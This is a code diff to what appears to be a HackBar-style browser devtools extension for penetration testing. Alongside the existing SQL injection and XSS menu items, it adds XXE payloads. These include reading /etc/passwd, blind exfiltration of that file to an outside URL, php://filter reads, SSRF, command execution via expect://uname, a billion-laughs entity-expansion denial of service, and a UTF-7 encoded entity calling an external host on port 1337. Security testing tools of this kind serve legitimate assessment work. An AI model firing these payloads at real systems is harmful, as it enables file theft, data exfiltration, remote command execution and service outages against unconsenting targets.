@@ -14,11 +14,7 @@ let enableUserAgentBtn = $('#enable_user_agent_btn');
 let enableCookieBtn = $('#enable_cookie_btn');
 let clearAllBtn = $('#clear_all');
 
-const menu_btn_array = ['md5', 'sha1', 'sha256', 'rot13',
-    'base64_encode', 'base64_decode', 'url_encode', 'url_decode', 'hex_encode', 'hex_decode',
-    'sql_mysql_char', 'sql_basic_info_column', 'sql_union_all_select', 'sql_union_all_select_null', 'sql_convert_utf8', 'sql_convert_latin1', 'sql_mssql_char', 'sql_oracle_char', 'sql_union_statement', 'sql_spaces_to_inline_comments',
-    'xss_string_from_charcode', 'xss_html_characters', 'xss_alert',
-    'jsonify', 'uppercase', 'lowercase',];
+const menu_btn_array = ['md5', 'sha1', 'sha256', 'rot13', 'base64_encode', 'base64_decode', 'url_encode', 'url_decode', 'hex_encode', 'hex_decode', 'sql_mysql_char', 'sql_basic_info_column', 'sql_union_all_select', 'sql_union_all_select_null', 'sql_convert_utf8', 'sql_convert_latin1', 'sql_mssql_char', 'sql_oracle_char', 'sql_union_statement', 'sql_spaces_to_inline_comments', 'xss_string_from_charcode', 'xss_html_characters', 'xss_alert', 'xxe_lfi', 'xxe_blind', 'xxe_load_resource', 'xxe_ssrf', 'xxe_rce', 'xxe_xee_local', 'xxe_xee_remove', 'xxe_utf7', 'jsonify', 'uppercase', 'lowercase'];
 
 let currentTabId = browser.devtools.inspectedWindow.tabId;
 let currentFocusField = urlField;
@@ -404,6 +400,85 @@ function onclickMenu(action, val) {
         case 'LFI':
             this.setSelectedText(val);
             break;
+
+        case 'xxe_lfi':
+            let xxeStr = '<?xml version="1.0"?>' +
+            '<!DOCTYPE foo [  ' +
+            '<!ELEMENT foo (#ANY)>' +
+            '<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
+            this.setSelectedText(xxeStr);
+            break;
+
+        case 'xxe_blind':
+            xxeStr = '<?xml version="1.0"?>' +
+            '<!DOCTYPE foo [' +
+            '<!ELEMENT foo (#ANY)>' +
+            '<!ENTITY % xxe SYSTEM "file:///etc/passwd">' +
+            '<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>';
+            this.setSelectedText(xxeStr);
+            break;
+
+        case 'xxe_load_resource':
+            xxeStr = '<?xml version="1.0"?>' +
+            '<!DOCTYPE foo [' +
+            '<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>' +
+            '<foo><result>&ac;</result></foo>';
+            this.setSelectedText(xxeStr);
+            break;
+
+        case 'xxe_ssrf':
+            xxeStr = '<?xml version="1.0"?>' +
+            '<!DOCTYPE foo [  ' +
+            '<!ELEMENT foo (#ANY)>' +
+            '<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>';
+            this.setSelectedText(xxeStr);
+            break;
+
+        case 'xxe_rce':
+            xxeStr = '[ run "uname" command]' +
+            '<?xml version="1.0" encoding="ISO-8859-1"?>' +
+            '<!DOCTYPE foo [ <!ELEMENT foo ANY >' +
+            '<!ENTITY xxe SYSTEM "expect://uname" >]>' +
+            '<creds>' +
+            '    <user>&xxe;</user>' +
+            '</creds>';
+            this.setSelectedText(xxeStr);
+            break;
+
+        case 'xxe_xee_local':
+            xxeStr = '<?xml version="1.0"?>' +
+            '<!DOCTYPE lolz [' +
+            '<!ENTITY lol "lol">' +
+            '<!ELEMENT lolz (#PCDATA)>' +
+            '<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' +
+            '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">' +
+            '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">' +
+            '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">' +
+            '<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">' +
+            '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">' +
+            '<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">' +
+            '<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">' +
+            '<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">' +
+            ']>' +
+            '<lolz>&lol9;</lolz>';
+            this.setSelectedText(xxeStr);
+            break;
+
+        case 'xxe_xee_remove':
+            xxeStr = '<?xml version="1.0"?>' +
+            '<!DOCTYPE lolz [' +
+            '<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>' +
+            '<lolz><lol>3..2..1...&test<lol></lolz>';
+            this.setSelectedText(xxeStr);
+            break;
+
+        case 'xxe_utf7':
+            xxeStr = '<?xml version="1.0" encoding="UTF-7"?>' +
+            '+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4' +
+            '+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+' +
+            '+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4';
+            this.setSelectedText(xxeStr);
+            break;
     }
     currentFocusField.focus();
 }
@@ -451,9 +526,9 @@ menu_btn_array.forEach(function (elementID) {
     });
 });
 
- $('#lfi .lfi_data').bind('click', function(e){
-        onclickMenu('LFI', this.text);
-    });
+$('#lfi .lfi_data').bind('click', function(e){
+    onclickMenu('LFI', this.text);
+});
 
 // Keyboard listener
 $(document).on('keypress', function (event) {
